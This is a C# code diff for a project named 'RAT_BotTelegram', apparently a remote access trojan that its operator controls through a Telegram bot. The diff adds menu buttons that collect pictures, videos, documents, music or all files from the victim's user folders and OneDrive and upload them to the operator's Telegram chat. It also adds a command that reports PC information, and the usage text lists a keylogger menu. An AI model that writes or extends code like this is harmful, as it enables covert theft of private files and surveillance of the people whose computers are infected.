@@ -86,11 +86,36 @@ namespace RAT_BotTelegram {
                             text:"Get Download",
                             callbackData: "getDownload")
                     }});
+                    var GetFilesOneDrive = new InlineKeyboardMarkup(new[]{
+                    new[]{
+                        InlineKeyboardButton.WithCallbackData(
+                            text: "Get Pictures from OneDrive ",
+                            callbackData: "GetPictures"),
+                        InlineKeyboardButton.WithCallbackData(
+                            text: "Get Videos from OneDrive",
+                            callbackData: "GetVideos"),
 
-                    //await Bot.SendTextMessageAsync(config.id, " NOTE: Absolutely all files will be obtained.");
-                    await Bot.SendTextMessageAsync(config.id, "Get files from?", replyMarkup: GetFiles);
+                    },new[]{
+                        InlineKeyboardButton.WithCallbackData(
+                            text:"Get Documents from OneDrive",
+                            callbackData: "GetDocument"),
+                        InlineKeyboardButton.WithCallbackData(
+                            text:"Get Music from OneDrive",
+                            callbackData: "GetMusic"),
+                    },new[]{
+                        InlineKeyboardButton.WithCallbackData(
+                            text:"Get all files from OneDrive",
+                            callbackData: "getDownload")
+                    }});
+
+                    await Bot.SendTextMessageAsync(config.id, " NOTE: Absolutely all files will be obtained.");
+                    await Bot.SendTextMessageAsync(config.id, "User Files: "+ Features.getUserName(), replyMarkup: GetFiles);        // Obtiene USER
+                    await Bot.SendTextMessageAsync(config.id, "OneDrive Files: ", replyMarkup: GetFilesOneDrive); // Obtiene USER Onedrive
                     // await Bot.SendTextMessageAsync(config.id, "NOTE: The process of obtaining files can take many minutes per file. \n[Depends on the upload speed of the computer]");
 
+                    break;
+                case "/Help":
+                    await Bot.SendTextMessageAsync(config.id, Tools.PC_Info());
                     break;
                 //Mensaje por default
                 default:
@@ -105,7 +130,7 @@ namespace RAT_BotTelegram {
                   "\n/Keylogger       |Menu| <keylogger Options >" +
                   "\n" +
                   "\n" +
-                  "\n" +
+                  "\n/Help <This>" +
                   "";
                     await Bot.SendTextMessageAsync(config.id, text: usage, replyMarkup: new ReplyKeyboardRemove());
                     break;
@@ -258,10 +283,8 @@ namespace RAT_BotTelegram {
                             case "[Video]":
                                 try {
                                     await Bot.SendVideoAsync(config.id, File.Open(file, FileMode.Open));
-                                } catch (Exception e) {
-                                    // Enviará el video pero por partes 10 Segundos x 10 segundos 
-                                  
-                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
+                                } catch {
+                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el video, " + GetFileName(file));
 
                                 }
                                 break;
@@ -269,7 +292,7 @@ namespace RAT_BotTelegram {
                                 try {
                                     await Bot.SendAudioAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
                                 } catch (Exception) {
-                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
+                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el audio, " + GetFileName(file));
                                 }
                                 break;
                             case "[Doc]":
@@ -279,7 +302,7 @@ namespace RAT_BotTelegram {
                                     await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
                                 }
                                 break;
-                            case "[P]": // El archivo se omitio por que pesa más de 50MB
+                            case "[System]": // El archivo se omitidos
                                 try {
                                     await Bot.SendDocumentAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
                                 } catch (Exception) {
@@ -293,9 +316,6 @@ namespace RAT_BotTelegram {
                     } else {
                         await Bot.SendTextMessageAsync(config.id, "El Archivo supera los 50MB, Por restriciones del API de telegram, éste archivo no se puede envíar" + GetFileName(file));
                     }
-                    
-
-                    
 
                     await Bot.SendTextMessageAsync(config.id, file);
                 }
@@ -308,7 +328,7 @@ namespace RAT_BotTelegram {
 
                 case "GetDocument":
 
-                    GetFilesTelegram(@"F:\New folder (2)");
+                    GetFilesTelegram(@"O:\Estoo");
                     break;
 
                 case "GetDocumenttgert":
